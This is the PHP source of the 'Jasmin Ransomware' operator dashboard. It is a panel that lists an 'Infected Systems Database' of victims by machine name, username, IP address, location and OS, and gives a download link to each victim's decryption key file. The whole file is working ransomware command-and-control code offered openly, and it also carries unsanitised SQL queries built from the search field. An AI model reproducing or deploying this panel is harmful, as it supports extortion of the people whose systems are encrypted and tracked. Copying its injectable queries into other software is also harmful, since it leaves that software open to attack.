<!DOCTYPE html>
<?php

session_start();
if( !isset($_SESSION['username']) ){
	header("Location: login.php");
}
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Jasmin Dashboard</title>
  <link rel="stylesheet" href="./assets/css/style2.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  
</head>
<body>
<!-- partial:index.partial.html -->
<h1><div class="flux">Jasmin Ransomware</div></h1>
<h2>Coded with Heart &#10084;&#65039 by  &#8594; <a href="http://github.com/codesiddhant/jasmin" target="_blank" class="yellow" > S i d d h a n t  _   G o u r</a></h2>
<h1><span class="yellow1">-Infected Systems Database-</span></h1>

<div class="wrap">
<form action="dashboard.php" method="get">
   <div class="search" class="container">
      <input required type="text" class="searchTerm" name="search" placeholder= "You Can Search Here i.e  &#34; systemid &#34; ">
	  <input type="hidden" name="pageno" value="1">
      <button type="submit" class="searchButton">
        <i class="fa fa-search"></i>
     </button>
   </div>
</div>


</form>

 <table class='container' id='myTable'>
	<thead>
		<tr>
			<th><h1>Machine Name</h1></th>
			<th><h1>Username</h1></th>
			<th><h1>IP Address</h1></th>
			<th><h1>Date</h1></th>
			<th><h1>Time</h1></th>
			<th><h1>Location</h1></th>
			<th><h1>os</h1></th>
			<th><h1>Decryption key</h1></th>
		</tr>
</thead>




	<?php
        include("database/db_conection.php");
		$total_pages;
		if(isset($_GET['search']) && isset($_GET['pageno']) )
{
        if (isset($_GET['pageno'])) {
            $pageno = $_GET['pageno'];
        } else 
		{
			
            $pageno = 1;
        }
		$search=$_GET['search'];
		
        $records_per_page = 6;
        $offset = ($pageno - 1) * $records_per_page;
		$total_pages_sql = "select count(*) from victims where (machine_name like '%$search%') OR (computer_user like '%$search%') OR (os like'%$search%') OR (ip like '%$search%') OR (location like '%$search%') OR (systemid like '%$search%')";
		$result = mysqli_query($dbcon,$total_pages_sql);
        $total_rows = mysqli_fetch_array($result)[0];
        $total_pages = ceil($total_rows / $records_per_page);
		if( $total_rows == 0 || $search == null || $pageno > $total_pages)
		{
			header("Location: ./assets/other/notfound.php");
		}
		
        $query="select * from victims where (machine_name like '$%search%') OR (computer_user like '%$search%') OR (os like'%$search%') OR (ip like '%$search%') OR (location like '%$search%') OR (systemid like '%$search%') LIMIT $offset, $records_per_page ";//select query for viewing users.
        $run=mysqli_query($dbcon, $query);//here run the sql query.
  while($row=mysqli_fetch_array($run))//while look to fetch the result and store in a array $row.
        {
            $machine_name=$row[1];
            $computer_user=$row[2];
			$os = $row[3];
            $date=$row[4];
            $time=$row[5];
			$ip=$row[6];
			$location=$row[7];
			$systemid=$row[8];
			                     
    //Logic to Retrive Correect Password File.
	$newtime = date("H-i-s", strtotime($time));  
	$password_folder_name = $machine_name. '_' .$computer_user;
	$password_file_name =  $newtime. '_' .$systemid;
	$password_file_extension = $password_file_name. "." ."flora";
	$file ='passwords/';
	$file .= $password_folder_name. '/' .$password_file_extension;
	
?>
	<tbody>
		<tr>
		    <td><?php echo $machine_name;?></td>
            <td><?php echo $computer_user;  ?></td>
            <td><?php echo $ip;  ?></td>
            <td><?php echo $date;  ?></td>
			<td><?php echo $time;  ?></td>
			<td><?php echo $location;  ?></td>
			<td><?php echo $os;  ?></td>
			<td><a href="download_file.php?file=<?php echo $file ?>"> <button class="btn"><i class="fa fa-download"></i> Download</button></a></td>
        </tr>
		</tbody> 
		
		<?php }
  
}
else
{ 	
        if (isset($_GET['pageno'])) {
            $pageno = $_GET['pageno'];
        } else {
            $pageno = 1;
        }
        $records_per_page = 6;
        $offset = ($pageno-1) * $records_per_page;
		$total_pages_sql = "select count(*) from victims";
        $result = mysqli_query($dbcon,$total_pages_sql);
        $total_rows = mysqli_fetch_array($result)[0];
        $total_pages = ceil($total_rows / $records_per_page);
		if($pageno > $total_pages)
		{	
		header("Location: ./assets/other/notfound.php");
		}
	
		$query = "select * from victims ORDER BY `id` DESC LIMIT $offset, $records_per_page ";//select query for viewing users.
        $run = mysqli_query($dbcon,$query);
		while($row = mysqli_fetch_array($run)){
            //here goes the data
            $machine_name=$row[1];
            $computer_user=$row[2];
			$os = $row[3];
            $date=$row[4];
            $time=$row[5];
			$ip=$row[6];
			$location=$row[7];
			$systemid=$row[8];
			                     
    //Logic to Retrive Correect Password File.
	$newtime = date("H-i-s", strtotime($time));  
	$password_folder_name = $machine_name. '_' .$computer_user;
	$password_file_name =  $newtime. '_' .$systemid;
	$password_file_extension = $password_file_name. "." ."flora";
	$file ='passwords/';
	$file .= $password_folder_name. '/' .$password_file_extension;
	
?>
	<tbody>
		<tr>
		    <td><?php echo $machine_name;?></td>
            <td><?php echo $computer_user;  ?></td>
            <td><?php echo $ip;  ?></td>
            <td><?php echo $date;  ?></td>
			<td><?php echo $time;  ?></td>
			<td><?php echo $location;  ?></td>
			<td><?php echo $os;  ?></td>
			<td><a href="download_file.php?file=<?php echo $file ?>"> <button class="btn"><i class="fa fa-download"></i> Download</button></a></td>
        </tr>
		
		</tbody> 
		
<?php }}

 ?>
</table> 

<ul>
<?php
$start=1; //staring number of button
$max=10; //max number of button

if(isset($_GET['search']) && isset($_GET['pageno']) ) //displaying only the search result
{
	if(isset($_GET['pageno']))
	{
		$pageno = $_GET['pageno'];
	}
	else
	{
      $pageno = 1;
	}
    $srch = "search=" .$_GET['search']. "&pageno";
}
	
else //displaying all the victims
{ 

    if(isset($_GET['pageno']))
	{
		$pageno = $_GET['pageno'];
	}
	else
	{
      $pageno = 1;
	}
    $srch = "pageno";
}   
        

//previous buttuon
if($pageno > 1)
{
	$prev = $pageno - 1;
}
else
{
	$prev = 1;
}
echo "<li><a class='' href='?".$srch."=".$prev."'><</a></li>";


//Pagination Algorithm
   if ($pageno >= 10 && $pageno <= $total_pages )
   {
	   $start = $pageno - $max + 2;
	   $max   = $pageno;
   }
   else if ( $pageno < $total_pages)
   {
	   $start=1;
       $max=10;	     
   }
   else if ($pageno > $total_pages)
   {
	 $pageno = 1;
	 $start=1;
     $max=10;	
   }
 
//priting page numbers in using for loop
    for($x = $start;$x <= $max;$x++) 
	{
		
		if($pageno == $x)
		{
			echo "<li><a class='active' href='?".$srch."=".$x."'>".$x."</a></li>";
			$x++;
		}
		if ($x > $total_pages)
		{
			break;
		}
		echo "<li><a class='' href='?".$srch."=".$x."'>".$x."</a></li>";

    }
	//next button
	$next = $pageno + 1 ;
	echo "<li><a class='' href='?".$srch."=".$next."'>></a></li>";
	
	
?>
</ul>   
<?php 
if (isset($_GET['pageno']))
{
          
      echo "<a href='dashboard.php'>  <button class='btn'><i class='fa fa-home' class='li'></i> back to home</button></a>" ;
	  echo "<a href='logout.php'>     <button class='btn'><i class='fa fa-sign-out'></i> &#160; Log Out &#160; &#160;</button></a>";
}
else
{
	  echo "<a href='dashboard.php'>  <button class='btn'><i class='fa fa-refresh' class='li'></i> &#160; Reload &#160;</button></a>" ;
	  echo "<a href='logout.php'>     <button class='btn'> <i class='fa fa-sign-out' class='li'> </i> &#160; &#160; Logout &#160;</button></a>";
}
?>

<p style="font-size:  80%;  padding-top: 15px; " >   © codesiddhant </p> 
	
</body>
</html> 
